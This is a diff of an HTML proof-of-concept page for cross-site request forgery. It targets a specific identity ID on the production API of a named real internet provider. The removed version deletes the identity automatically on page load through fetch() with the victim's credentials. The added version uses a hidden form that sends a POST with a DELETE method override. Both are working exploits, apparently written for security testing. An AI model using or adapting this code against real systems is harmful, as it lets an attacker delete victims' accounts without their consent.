@@ -1,19 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CSRF PoC</title>
-</head>
-<body>
-  <h1>CSRF PoC - Auto Submit</h1>
-  <script>
-    fetch("https://api.prd.telenet.be/ocapi/public/api/customer-service/v1/identities/19356750", {
-      method: "DELETE",
-      credentials: "include"
-    }).then(response => {
-      console.log("Request sent:", response.status);
-    }).catch(err => {
-      console.error("Error:", err);
-    });
-  </script>
-</body>
+  <head>
+    <title>CSRF PoC</title>
+  </head>
+  <body>
+    <h3>Click the button to trigger the CSRF request</h3>
+    <form action="https://api.prd.telenet.be/ocapi/public/api/customer-service/v1/identities/19356750" method="POST">
+      <input type="hidden" name="_method" value="DELETE">
+      <input type="submit" value="Submit CSRF">
+    </form>
+  </body>
 </html>
